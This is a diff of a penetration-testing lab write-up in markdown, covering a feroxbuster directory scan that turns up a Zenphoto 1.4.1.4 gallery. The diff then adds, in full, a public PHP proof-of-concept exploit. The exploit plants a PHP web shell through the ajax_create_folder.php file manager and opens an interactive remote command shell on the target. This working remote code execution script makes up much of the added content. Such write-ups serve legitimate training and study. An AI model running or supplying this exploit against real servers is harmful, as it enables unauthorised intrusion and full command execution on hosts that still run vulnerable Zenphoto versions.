@@ -22,6 +22,7 @@ IP: 192.168.241.41
 ## Used tools
 - nmap
 - rustscan
+- feroxbuster
 
 ---
 
@@ -115,7 +116,7 @@ Nmap done: 1 IP address (1 host up) scanned in 45.27 seconds
 
 Enumerated open TCP ports:
 ```bash
-
+80
 ```
 
 Enumerated top 200 UDP ports:
@@ -126,9 +127,163 @@ Enumerated top 200 UDP ports:
 ---
 
 # Enumeration
-## Port 80 - HTTP (Apache)
+## Port 80 - HTTP Apache httpd 2.2.14
 
 #### -Navigated to "target IP" and found the following web page:
+
+#### -Typed "feroxbuster -u [target IP] -C 401 403 405 -x php,txt,json,docx"
+
+feroxbuster -u http://192.168.143.41 -C 401 403 405 -x php,txt,json,docx
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.4.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://192.168.143.41
+ 🚀  Threads               │ 100
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💢  Status Code Filters   │ [401, 403, 405]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.4.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ [php, txt, json, docx]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+200        4l        5w       75c http://192.168.143.41/index
+301        9l       28w      315c http://192.168.143.41/test
+200      101l      416w     5015c http://192.168.143.41/test/index
+301        9l       28w      322c http://192.168.143.41/test/themes
+200      101l      416w     5015c http://192.168.143.41/test/index.php
+301        9l       28w      322c http://192.168.143.41/test/albums
+301        9l       28w      323c http://192.168.143.41/test/plugins
+301        9l       28w      321c http://192.168.143.41/test/cache
+301        9l       28w      330c http://192.168.143.41/test/themes/default
+200        0l        0w        0c http://192.168.143.41/test/themes/default/contact
+301        9l       28w      337c http://192.168.143.41/test/themes/default/images
+200        0l        0w        0c http://192.168.143.41/test/themes/default/index
+200        0l        0w        0c http://192.168.143.41/test/themes/default/register
+200        0l        0w        0c http://192.168.143.41/test/themes/default/contact.php
+200        0l        0w        0c http://192.168.143.41/test/themes/default/index.php
+200        0l        0w        0c http://192.168.143.41/test/themes/default/register.php
+200        0l        0w        0c http://192.168.143.41/test/themes/default/image
+200        0l        0w        0c http://192.168.143.41/test/themes/default/image.php
+200        0l        0w        0c http://192.168.143.41/test/themes/default/password
+200        1l        2w     1406c http://192.168.143.41/test/favicon
+200        8l       16w      190c http://192.168.143.41/test/robots
+200        8l       16w      190c http://192.168.143.41/test/robots.txt
+301        9l       28w      337c http://192.168.143.41/test/themes/default/styles
+[####################] - 15m  7719075/7719075 0s      found:23      errors:1436189
+[####################] - 12m  1102725/1102725 1500/s  http://192.168.143.41
+[####################] - 12m  1102725/1102725 1478/s  http://192.168.143.41/test
+[####################] - 11m  1102725/1102725 1543/s  http://192.168.143.41/test/themes
+[####################] - 14m  1102725/1102725 1279/s  http://192.168.143.41/test/albums
+[####################] - 11m  1102725/1102725 1565/s  http://192.168.143.41/test/plugins
+[####################] - 14m  1102725/1102725 1243/s  http://192.168.143.41/test/cache
+[####################] - 11m  1102725/1102725 1617/s  http://192.168.143.41/test/themes/default
+
+
+#### -Per the previous feroxbuster results I navigated to "http://[target IP]/test" and found the following web page which shows it is being run by Zenphoto:
+
+![](Pasted%20image%2020221111200923.png)
+
+#### -Read the source page of "feroxbuster -u [http://[target IP]/test" and found Zenphoto version 1.4.1.4:
+
+![](Pasted%20image%2020221111200956.png)
+
+#### -Googled "Zenphoto version 1.4.1.4 exploit" and found the following:
+#ZenPhoto
+
+```php
+<?php
+
+/*
+    --------------------------------------------------------------------------
+    Zenphoto <= 1.4.1.4 (ajax_create_folder.php) Remote Code Execution Exploit
+    --------------------------------------------------------------------------
+    
+    author............: Egidio Romano aka EgiX
+    mail..............: n0b0d13s[at]gmail[dot]com
+    software link.....: http://www.zenphoto.org/
+    
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] Vulnerability overview:
+    
+    All versions of Zenphoto from 1.2.4 to 1.4.1.4 are affected by the
+    vulnerability that I reported to http://www.exploit-db.com/exploits/18075/
+    
+    [-] Disclosure timeline:
+    
+    [21/10/2011] - Vulnerability discovered
+    [24/10/2011] - Issue reported to http://www.zenphoto.org/trac/ticket/2005
+    [31/10/2011] - Fix released with version 1.4.1.5
+    [05/11/2011] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No response from {$host}:80\n");
+
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+print "\n+-----------------------------------------------------------+";
+print "\n| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |";
+print "\n+-----------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /zenphoto/\n";
+    die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$payload = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
+$packet  = "POST {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+http_send($host, $packet);
+
+$packet  = "GET {$path}zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+    print "\nzenphoto-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+
+?>
+```
+
+
+
 ---
 
 # Exploitation
